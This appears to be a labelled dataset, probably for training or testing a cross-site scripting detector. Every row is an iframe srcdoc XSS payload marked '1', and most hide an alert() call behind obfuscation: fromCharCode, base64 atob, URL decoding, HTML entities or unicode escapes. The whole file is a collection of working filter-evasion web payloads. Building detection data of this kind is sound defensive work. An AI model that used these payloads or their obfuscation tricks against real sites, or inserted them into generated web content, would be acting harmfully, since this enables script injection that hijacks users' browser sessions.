"<iframe srcdoc=""<svg onload='setTimeout(() => eval(String.fromCharCode(97,108,101,114,116,40,49,41)), 0)'></svg>""></iframe>",1
"<iframe srcdoc=""<svg onload='setTimeout(`alert(28)`,0)'>"">",1
"<iframe srcdoc=""<svg onload='window[&quot;a&quot;+&quot;lert&quot;](1)'></svg>""></iframe>",1
"<iframe srcdoc=""<svg onload='window[String.fromCharCode(97,108,101,114,116)](1)'></svg>""></iframe>",1
"<iframe srcdoc=""<svg onload=(function(){window['ale'+'rt'](7)})()>""></iframe>",1
"<iframe srcdoc=""<svg onload=Function('al'+'ert(1)')()>"">",1
"<iframe srcdoc=""<svg onload=Function('al'+'ert(1)')()>""></iframe>",1
"<iframe srcdoc=""<svg onload=Function('al'+'ert(19)')()>""></iframe>",1
"<iframe srcdoc=""<svg onload=Function('al'+String.fromCharCode(101,114,116,40,49,41))()>""></iframe>",1
"<iframe srcdoc=""<svg onload=alert(/XSS/.source)></svg>""></iframe>",1
"<iframe srcdoc=""<svg onload=alert(1)>""></iframe>",1
"<iframe srcdoc=""<svg onload=document.write(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62))>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(&#96;&#97;&#108;&#101;&#114;&#116;&#96;+&#96;&#40;&#96;+&#96;1&#96;+&#96;&#41;&#96;)>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval('&#97;&#108;&#101;&#114;&#116;(1)')>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval('&#x61;&#x6C;&#x65;&#x72;&#x74;(1)')>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval('&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x22;&#x58;&#x53;&#x53;&#x22;&#x29;')>"">",1
"<iframe srcdoc=""<svg onload=eval('&#x61;&#x6c;&#x65;&#x72;&#x74;(1)')>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(''.concat('aler','t(1)'))></svg>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval('\\u0061\\u006c\\u0065\\u0072\\u0074(1)')>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval('\u0061\u006c\u0065\u0072\u0074(1)')>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval('\u0061lert(2)')>"">",1
"<iframe srcdoc=""<svg onload=eval('\u0061lert(4)')>"">",1
"<iframe srcdoc=""<svg onload=eval('al'+'ert(1)')>"">",1
"<iframe srcdoc=""<svg onload=eval('al'+'ert(1)')>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval('al'+'ert(1)')></svg>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval('al'+'ert(16)')>"">",1
"<iframe srcdoc=""<svg onload=eval('al'+String.fromCharCode(101,114)+'t(`XSS`)')></svg>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval('decodeURIComponent(escape(unescape(\\u0061\\u006c\\u0065\\u0072\\u0074(1))))')>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(String.fromCharCode(0x61,0x6C,0x65,0x72,0x74,40,49,41))>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74)+'(1)')>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,0x28,0x31,0x29))>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,40,49,41))>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(String.fromCharCode(119,105,110,100,111,119,46,97,108,101,114,116,40,49,41))>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(String.fromCharCode(119,105,110,100,111,119,91,39,97,108,101,114,116,39,93,40,49,41))>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+'(1)')>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+String.fromCharCode(40)+String.fromCharCode(49)+String.fromCharCode(41))>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(String.fromCharCode(97,108,101,114,116)+'(1)')>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))>"">",1
"<iframe srcdoc=""<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))></svg>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>"" >",1
"<iframe srcdoc=""<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>"">",1
"<iframe srcdoc=""<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))></iframe>"">",1
"<iframe srcdoc=""<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))></svg>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,49,49,41))>"">",1
"<iframe srcdoc=""<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,50,41))>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(String.fromCharCode.apply(null,[97,108,101,114,116,40,49,41]))>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(String['fromCharCode'](97,108,101,114,116,40,49,41))></svg>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(`&#x61;&#x6C;&#x65;&#x72;&#x74;(1)`)>"" ></iframe>",1
"<iframe srcdoc=""<svg onload=eval(`&#x61;&#x6C;&#x65;&#x72;&#x74;(1)`)>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)></iframe>"">",1
"<iframe srcdoc=""<svg onload=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)></svg>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(`\u0061\u006c\u0065\u0072\u0074(1)`)>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(`al\x65rt(1)`)></svg>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(`window[String.fromCharCode(97,108,101,114,116)](1)`)></svg>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(atob(&#39;YWxlcnQoMSk=&#39;))>"">",1
"<iframe srcdoc=""<svg onload=eval(atob(&#39;YWxlcnQoMSk=&#39;))></svg>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(atob(&#39;d2luZG93LmFsZXJ0KDEp&#39;))>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(atob(&#x27;YWxlcnQoMSk=&#x27;))>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(atob('YWxlcnQ='))(1)>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(atob('YWxlcnQoIlhTUyIp'))>"">",1
"<iframe srcdoc=""<svg onload=eval(atob('YWxlcnQoJ1hTUycp'))>"">",1
"<iframe srcdoc=""<svg onload=eval(atob('YWxlcnQoJ1hTUycp'))>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(atob('YWxlcnQoJ1hTUycp'))></svg>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(atob('YWxlcnQoMSk='))>"" />",1
"<iframe srcdoc=""<svg onload=eval(atob('YWxlcnQoMSk='))>"">",1
"<iframe srcdoc=""<svg onload=eval(atob('YWxlcnQoMSk='))>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(atob('YWxlcnQoMSk='))></svg>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(atob('YWxlcnQoMTEp'))>"">",1
"<iframe srcdoc=""<svg onload=eval(atob('YWxlcnQoMTExKQ=='))>"">",1
"<iframe srcdoc=""<svg onload=eval(atob('YWxlcnQoMTExKQ=='))>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(atob('YWxlcnQoMTIzKQ=='))>"">",1
"<iframe srcdoc=""<svg onload=eval(atob('YWxlcnQoMTIzKQ=='))></svg>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(atob('d2luZG93LmFsZXJ0KDEp'))>"">",1
"<iframe srcdoc=""<svg onload=eval(atob('d2luZG93WydhbGVydCddKDEp'))>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(atob(`YWxlcnQoMSk=`))>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(decodeURI('%61%6C%65%72%74(1)'))>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(decodeURI('a%6c%65%72%74%28%27%58%53%53%27%29'))></svg>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(decodeURIComponent(&#39;%61%6c%65%72%74%28%31%29&#39;))></svg>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(decodeURIComponent(&quot;%61%6c%65%72%74%28%31%29&quot;))></svg>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(decodeURIComponent('%61%6C%65%72%74%28%31%29'))>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(decodeURIComponent('%61%6C%65%72%74%28%31%29'))></svg>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(decodeURIComponent('%61%6C%65%72%74%281%29'))>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(decodeURIComponent('%61%6C%65%72%74(1)'))>"" />",1
"<iframe srcdoc=""<svg onload=eval(decodeURIComponent('%61%6C%65%72%74(1)'))>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(decodeURIComponent('%61%6c%65%72%74%28%31%29'))>"">",1
"<iframe srcdoc=""<svg onload=eval(decodeURIComponent('%61%6c%65%72%74%28%31%29'))>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(decodeURIComponent('%61%6c%65%72%74%28%31%29'))></svg>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(decodeURIComponent('%61%6c%65%72%74(1)'))>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(decodeURIComponent('%61%6c%65%72%74(49)'))>"">",1
"<iframe srcdoc=""<svg onload=eval(eval('Str'+'\u0069ng.fromCharCode')(97,108,101,114,116,40,49,41))>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(eval('Str'+'ing.fromCharCode')(97,108,101,114,116,40,49,41))>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(eval('String.fromCharCode')(97,108,101,114,116,40,49,41))>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(unescape('%61%6C%65%72%74%281%29'))>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(unescape('%61%6c%65%72%74%28%27%58%53%53%27%29'))>"">",1
"<iframe srcdoc=""<svg onload=eval(unescape('%61%6c%65%72%74%28%31%29'))>"">",1
"<iframe srcdoc=""<svg onload=eval(unescape('%61%6c%65%72%74%28%31%29'))>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(unescape('%61%6c%65%72%74%28%31%29'))></svg>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(unescape('%61%6c%65%72%74%28%31%32%33%29'))></svg>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(unescape('%61%6c%65%72%74(1)'))>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(unescape('%61%6c%65%72%74(49,49,49)'))>"">",1
"<iframe srcdoc=""<svg onload=eval(unescape('%61lert(1)'))>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(unescape('%u0061lert(1)'))>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(unescape('al%65rt(1)'))>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(window['unescape']('%61%6c%65%72%74(1)'))>""></iframe>",1
"<iframe srcdoc=""<svg onload=parent['al'+String.fromCharCode(101,114,116)]('XSS')>"">",1
"<iframe srcdoc=""<svg onload=parent[atob('YWxlcnQ=')](1)>"">",1
"<iframe srcdoc=""<svg onload=self['alert'](String.fromCharCode(88,83,83))>"">",1
"<iframe srcdoc=""<svg onload=setInterval('al'+'ert(1)',1000)>""></iframe>",1
"<iframe srcdoc=""<svg onload=setInterval('window[&quot;al&quot;+&quot;ert&quot;](1)',1000)></svg>""></iframe>",1
"<iframe srcdoc=""<svg onload=setInterval(atob('YWxlcnQoMSk='),100)>""></iframe>",1
"<iframe srcdoc=""<svg onload=setTimeout(&#39;a&#x6C;&#x65;&#x72;&#x74;(1)&#39;,0)>""></iframe>",1
"<iframe srcdoc=""<svg onload=setTimeout(&#x27;alert(1)&#x27;,0)>""></iframe>",1
"<iframe srcdoc=""<svg onload=setTimeout('\\u0061\\u006c\\u0065\\u0072\\u0074(1)',0)>""></iframe>",1
"<iframe srcdoc=""<svg onload=setTimeout('a'+'lert(1)',0)>""></iframe>",1
"<iframe srcdoc=""<svg onload=setTimeout('a\x6cert(1)') />"">",1
"<iframe srcdoc=""<svg onload=setTimeout('al'+'\x65rt(1)',0)>""></iframe>",1
"<iframe srcdoc=""<svg onload=setTimeout('al'+'ert(1)',0)>""></iframe>",1
"<iframe srcdoc=""<svg onload=setTimeout('al'+'ert(2)',0)>""></iframe>",1
"<iframe srcdoc=""<svg onload=setTimeout('al'+'ert(6)',0)>""></iframe>",1
"<iframe srcdoc=""<svg onload=setTimeout('ale'+'rt(1)',0)>""></iframe>",1
"<iframe srcdoc=""<svg onload=setTimeout('ale'+'rt(1)',0)></svg>""></iframe>",1
"<iframe srcdoc=""<svg onload=setTimeout('eval(String.fromCharCode(97,108,101,114,116,40,49,41))',0)></svg>""></iframe>",1
"<iframe srcdoc=""<svg onload=setTimeout('eval(`\\u0061lert(1)`)',0)>""></iframe>",1
"<iframe srcdoc=""<svg onload=setTimeout('eval(atob(`YWxlcnQoJ1hTUycp`))',0)>"">",1
"<iframe srcdoc=""<svg onload=setTimeout(String.fromCharCode(97,108,101,114,116)+'(1)',0)>""></iframe>",1
"<iframe srcdoc=""<svg onload=setTimeout(String.fromCharCode(97,108,101,114,116)+'(1)',10)>""></iframe>",1
"<iframe srcdoc=""<svg onload=setTimeout(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`,0)>""></iframe>",1
"<iframe srcdoc=""<svg onload=setTimeout(`al\\u0065rt(1)`,0)>""></iframe>",1
"<iframe srcdoc=""<svg onload=setTimeout(`al\u0065rt(1)`,0)>""></iframe>",1
"<iframe srcdoc=""<svg onload=setTimeout(`al\x65rt(1)`,0)>"">",1
"<iframe srcdoc=""<svg onload=setTimeout(`al`+`ert(1)`,0)>""></iframe>",1
"<iframe srcdoc=""<svg onload=setTimeout(`al`+`ert(1)`,0)>""></svg>",1
"<iframe srcdoc=""<svg onload=setTimeout(`al`+`ert(1)`,0)></svg>""></iframe>",1
"<iframe srcdoc=""<svg onload=setTimeout(`window['al'+'ert'](1)`,0)>""></iframe>",1
"<iframe srcdoc=""<svg onload=setTimeout(`window['al'+'ert'](1)`,100)>""></iframe>",1
"<iframe srcdoc=""<svg onload=setTimeout(atob(&#x27;YWxlcnQoMSk=&#x27;),0)>""></iframe>",1
"<iframe srcdoc=""<svg onload=setTimeout(atob('YWxlcnQ=')+'(1)',0)>""></iframe>",1
"<iframe srcdoc=""<svg onload=setTimeout(atob('YWxlcnQoMSk='),0)>"" ></iframe>",1
"<iframe srcdoc=""<svg onload=setTimeout(atob('YWxlcnQoMSk='),0)>""></iframe>",1
"<iframe srcdoc=""<svg onload=setTimeout(function(){window['al'+'ert'](1)},0)>""></iframe>",1
"<iframe srcdoc=""<svg onload=setTimeout(window['al'+'ert'],0,1)>""></iframe>",1
"<iframe srcdoc=""<svg onload=top['a'+'l'+'ert']('XSS')>"">",1
"<iframe srcdoc=""<svg onload=top['al'+'ert']('XSS')>"">",1
"<iframe srcdoc=""<svg onload=top['al'+'ert']('XSS')></svg>"">",1
"<iframe srcdoc=""<svg onload=top[('alert')](1)>"">",1
"<iframe srcdoc=""<svg onload=window&#x2e;aler&#x74;&#x28;&#x31;&#x29;>"">",1
"<iframe srcdoc=""<svg onload=window[&#x27;al&#x27;+&#x27;ert&#x27;](1)>""></iframe>",1
"<iframe srcdoc=""<svg onload=window[&apos;al&apos;+&apos;ert&apos;](1)>""></iframe>",1
"<iframe srcdoc=""<svg onload=window[&quot;&#x61;&#x6c;&#x65;&#x72;&#x74;&quot;](1)>""></iframe>",1
"<iframe srcdoc=""<svg onload=window[&quot;a&quot;+&quot;lert&quot;](1)>""></iframe>",1
"<iframe srcdoc=""<svg onload=window[&quot;al&quot;+&quot;ert&quot;](1)>""></iframe>",1
"<iframe srcdoc=""<svg onload=window['Function']('al'+'ert(1)')()>""></iframe>",1
"<iframe srcdoc=""<svg onload=window['\u0061\u006c\u0065\u0072\u0074'](1) />""></iframe>",1
"<iframe srcdoc=""<svg onload=window['\u0061\u006c\u0065\u0072\u0074'](1)>""></iframe>",1
"<iframe srcdoc=""<svg onload=window['\u0065\u0076\u0061\u006c']('\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029')>""></iframe>",1
"<iframe srcdoc=""<svg onload=window['\x61\x6c\x65\x72\x74'](1)>"">",1
"<iframe srcdoc=""<svg onload=window['\x61\x6c\x65\x72\x74'](String.fromCharCode(49,49,49))>"">",1
"<iframe srcdoc=""<svg onload=window['\x65\x76\x61\x6c']('\u0061\u006c\u0065\u0072\u0074(49,49,49)')>"">",1
"<iframe srcdoc=""<svg onload=window['a'+'l'+'ert'](1) />""></iframe>",1
"<iframe srcdoc=""<svg onload=window['a'+'ler'+'t'](1)>"">",1
"<iframe srcdoc=""<svg onload=window['a'+'lert'](1)>""></iframe>",1
"<iframe srcdoc=""<svg onload=window['al'+'\u0065rt'](1)>""></iframe>",1
"<iframe srcdoc=""<svg onload=window['al'+'\x65rt'](1)>""></iframe>",1
"<iframe srcdoc=""<svg onload=window['al'+'ert']('XSS')>"">",1
"<iframe srcdoc=""<svg onload=window['al'+'ert'](0x1)>""></iframe>",1
"<iframe srcdoc=""<svg onload=window['al'+'ert'](1)>"" />",1
"<iframe srcdoc=""<svg onload=window['al'+'ert'](1)>"">",1
"<iframe srcdoc=""<svg onload=window['al'+'ert'](1)>""></iframe>",1
"<iframe srcdoc=""<svg onload=window['al'+'ert'](1)></svg>""></iframe>",1
"<iframe srcdoc=""<svg onload=window['al'+'ert'](111)>"">",1
"<iframe srcdoc=""<svg onload=window['al'+'ert'](2)>""></iframe>",1
"<iframe srcdoc=""<svg onload=window['al'+'ert'](`1`)>""></iframe>",1
"<iframe srcdoc=""<svg onload=window['al'+'ert'].apply(null,[1])>""></iframe>",1
"<iframe srcdoc=""<svg onload=window['al'+String.fromCharCode(101,114,116)](1)>""></iframe>",1
"<iframe srcdoc=""<svg onload=window['al\x65rt'](1)>""></iframe>",1
"<iframe srcdoc=""<svg onload=window['ale'+'rt'](1)>"">",1
"<iframe srcdoc=""<svg onload=window['ale'+'rt'](1)>""></iframe>",1
"<iframe srcdoc=""<svg onload=window['ale'+'rt'](1)></svg>""></iframe>",1
"<iframe srcdoc=""<svg onload=window['ale'+'rt'](123)>"">",1
"<iframe srcdoc=""<svg onload=window['ale'+'rt'](14)>""></iframe>",1
"<iframe srcdoc=""<svg onload=window['ev'+'al']('&#x61;&#x6C;&#x65;&#x72;&#x74;(1)')>""></iframe>",1
"<iframe srcdoc=""<svg onload=window['ev'+'al']('al'+'ert(1)')>"">",1
"<iframe srcdoc=""<svg onload=window['ev'+'al']('al'+'ert(1)')>""></iframe>",1
"<iframe srcdoc=""<svg onload=window['ev'+'al'](atob('YWxlcnQoMSk='))>""></iframe>",1
"<iframe srcdoc=""<svg onload=window['setTimeout']('al'+'ert(1)',0)>""></iframe>",1
"<iframe srcdoc=""<svg onload=window[String.fromCharCode(97,108,101,114,116)](1)>""></iframe>",1
"<iframe srcdoc=""<svg onload=window[String.fromCharCode(97,108,101,114,116)](1)></svg>""></iframe>",1
"<iframe srcdoc=""<svg onload=window[`\u0061lert`](1)></svg>""></iframe>",1
"<iframe srcdoc=""<svg onload=window[`al${'ert'}`](1)>""></iframe>",1
"<iframe srcdoc=""<svg onload=window[`al`+'ert'](1)>""></iframe>",1
"<iframe srcdoc=""<svg onload=window[`al`+`ert`](1)>""></iframe>",1
"<iframe srcdoc=""<svg onload=window[atob('YWx'+'lcnQ=')](1)>""></iframe>",1
"<iframe srcdoc=""<svg onload=window[atob('YWxlcnQ=')](1)>""></iframe>",1
"<iframe srcdoc=""<svg onload=window[atob('YWxlcnQ=')](1)></svg>""></iframe>",1
"<iframe srcdoc=""<svg onload=window[unescape('%61%6c%65%72%74')](1)>""></iframe>",1
"<iframe srcdoc=""<svg xmlns='http://www.w3.org/2000/svg' onload='javascript:alert(1)'></svg>""></iframe>",1
"<iframe srcdoc=""<svg/onload=&#97;&#108;&#101;&#114;&#116;&#40;&#96;&#49;&#96;&#41;>"">",1
"<iframe srcdoc=""<svg/onload='eval(`al`+`ert(1)`);'>"">",1
"<iframe srcdoc=""<svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>"">",1
"<iframe srcdoc=""<svg/onload=eval(atob('YWxlcnQoMSk='))>""></iframe>",1
"<iframe srcdoc=""<svg/onload=setTimeout(eval,0,decodeURIComponent('a%6cert(%2F1%2F)'))>"">",1
"<iframe srcdoc=""<svg/onload=window['alert'](11)>""></iframe>",1
"<iframe srcdoc=""<svg><script>const f=Function;f('ale'+'rt(1)')()</script>"">",1
"<iframe srcdoc=""<svg><script>self['ale'+'rt']('XSS')</script></svg>""></iframe>",1
"<iframe srcdoc='&lt;img src=x onerror=eval(atob(""YWxlcnQoMSk=""))&gt;'>",1
"<iframe srcdoc='<img src=x onerror=""e=alert,e(1)"">'></iframe>",1
"<iframe srcdoc='<img src=x onerror=""eval(String.fromCharCode(97,108,101,114,116,40,49,41))"">'></iframe>",1
"<iframe srcdoc='<img src=x onerror=""window[`\x61\x6c\x65\x72\x74`](8)"">'/>",1
"<iframe srcdoc='<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116)+""(1)"");>'></iframe>",1
"<iframe srcdoc='<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>'></iframe>",1
<iframe srcdoc='<img src=x onerror=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)>'></iframe>,1
<iframe srcdoc='<img src=x onerror=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(2)`)>'></iframe>,1
<iframe srcdoc='<img src=x onerror=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(5)`)>'></iframe>,1
"<iframe srcdoc='<img src=x onerror=eval(atob(""YWxlcnQoMSk=""))>'>",1
"<iframe srcdoc='<img src=x onerror=eval(atob(""YWxlcnQoMSk=""))>'></iframe>",1
"<iframe srcdoc='<img src=x onerror=eval(atob(""YWxlcnQoMik=""))>'></iframe>",1
<iframe srcdoc='<img src=x onerror=eval(atob(&#39;d2luZG93WydhbGVydCddKDEp&#39;))>'></iframe>,1
<iframe srcdoc='<img src=x onerror=eval(atob(&quot;YWxlcnQoMSk=&quot;))>'></iframe>,1
"<iframe srcdoc='<img src=x onerror=eval(decodeURIComponent(""%61%6C%65%72%74(1)""))>'></iframe>",1
"<iframe srcdoc='<img src=x onerror=eval(decodeURIComponent(""%61%6c%65%72%74%281%29""))>'></iframe>",1
"<iframe srcdoc='<img src=x onerror=eval(unescape(""al%65rt(%31)""))>'></iframe>",1
"<iframe srcdoc='<img src=x onerror=setTimeout(String.fromCharCode(97,108,101,114,116)+""(1)"",0)>'></iframe>",1
"<iframe srcdoc='<img src=x onerror=setTimeout(`\\u0061lert(1)`,0)>'></iframe>",1
"<iframe srcdoc='<img src=x onerror=setTimeout(`al`+`ert(1)`,0)>'></iframe>",1
"<iframe srcdoc='<img src=x onerror=setTimeout(`alert(1)`,0)>'></iframe>",1
"<iframe srcdoc='<img src=x onerror=setTimeout(atob(`YWxlcnQ=`)+""(1)"",0)>'></iframe>",1
"<iframe srcdoc='<img src=x onerror=window[""a""+""l""+""ert""](1)>'></iframe>",1
"<iframe srcdoc='<img src=x onerror=window[""al""+""ert""](1)>'></iframe>",1
"<iframe srcdoc='<img src=x onerror=window[""ev""+""al""](atob(""YWxlcnQoMSk=""))>'></iframe>",1
"<iframe srcdoc='<img src=x onerror=window[String.fromCharCode(97,108,101,114,116)](1)>'></iframe>",1
<iframe srcdoc='<img src=x onerror=window[`al`+`ert`](1)>'></iframe>,1
"<iframe srcdoc='<img src=x onerror=window[atob(""YWxlcnQ="")](1)>'></iframe>",1
"<iframe srcdoc='<img src=x onerror=window[unescape(""%61lert"")](1)>'></iframe>",1
"<iframe srcdoc='<meta http-equiv=""refresh"" content=""0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="">'></iframe>",1
"<iframe srcdoc='<object data=""data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+""></object>'>",1
"<iframe srcdoc='<object data=""data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+""></object>'></iframe>",1
"<iframe srcdoc='<script>eval(atob(""YWxlcnQoIlhTUyIp""))</script>'>",1
"<iframe srcdoc='<script>new Function(""return eval"")()(unescape(""%61%6c%65%72%74%28%31%29""))</script>'>",1
"<iframe srcdoc='<script>setTimeout(()=>eval(atob(""YWxlcnQoJ1hTUycp"")),0)</script>'></iframe>",1
"<iframe srcdoc='<script>window[""al""+""ert""](1)</script>'></iframe>",1
"<iframe srcdoc='<script>window[String.fromCharCode(97,108,101,114,116)](1)</script>'></iframe>",1
"<iframe srcdoc='<svg onload=""&#97;&#108;&#101;&#114;&#116;(&#96;&#88;&#83;&#83;&#96;)""></svg>'>",1
"<iframe srcdoc='<svg onload=""eval(String.fromCharCode(97,108,101,114,116,40,49,41))""></svg>'></iframe>",1
"<iframe srcdoc='<svg onload=""window[&#39;al&#39;+&#39;ert&#39;](`XSS`)""></svg>'>",1
"<iframe srcdoc='<svg onload=eval(""al""+""ert(1)"")>'></iframe>",1
"<iframe srcdoc='<svg onload=eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74)+String.fromCharCode(40,49,41))>'></iframe>",1
<iframe srcdoc='<svg onload=eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+String.fromCharCode(40)+String.fromCharCode(49)+String.fromCharCode(41))>'></iframe>,1
"<iframe srcdoc='<svg onload=eval(String.fromCharCode(97,108,101,114,116)+""(1)"");>'></iframe>",1
"<iframe srcdoc='<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>'></iframe>",1
"<iframe srcdoc='<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,52,41))>'></iframe>",1
"<iframe srcdoc='<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,55,41))>'></iframe>",1
<iframe srcdoc='<svg onload=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)>'></iframe>,1
"<iframe srcdoc='<svg onload=eval(atob(""YWxlcnQoMSk=""))>'></iframe>",1
"<iframe srcdoc='<svg onload=eval(atob(""YWxlcnQoMSk=""))></svg>'>",1
"<iframe srcdoc='<svg onload=eval(atob(""YWxlcnQoMSk=""))></svg>'></iframe>",1
"<iframe srcdoc='<svg onload=eval(atob(""YWxlcnQoMik=""))>'></iframe>",1
